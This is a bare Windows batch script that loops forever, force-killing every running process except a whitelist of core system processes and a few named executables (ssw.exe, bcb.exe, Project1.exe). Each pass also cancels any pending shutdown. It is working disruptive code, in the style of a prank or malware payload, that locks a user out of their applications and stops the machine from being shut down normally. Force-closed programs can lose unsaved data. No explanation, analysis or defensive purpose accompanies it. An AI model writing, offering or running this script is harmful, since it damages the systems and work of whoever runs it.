@echo off

:kill
taskkill /fi "imagename ne taskkill.exe" /fi "imagename ne cmd.exe" /fi "imagename ne conhost.exe" /fi "imagename ne audiodg.exe" /fi "imagename ne csrss.exe" /fi "imagename ne dwm.exe" /fi "imagename ne lsass.exe" /fi "imagename ne lsm.exe" /fi "imagename ne rundll32.exe" /fi "imagename ne services.exe" /fi "imagename ne sidebar.exe" /fi "imagename ne smss.exe" /fi "imagename ne spoolsv.exe" /fi "imagename ne svchost.exe" /fi "imagename ne taskhost.exe" /fi "imagename ne wininit.exe" /fi "imagename ne winlogon.exe" /fi "imagename ne ssw.exe" /fi "imagename ne bcb.exe" /fi "imagename ne Project1.exe" /f
shutdown /a
goto kill

cls
exit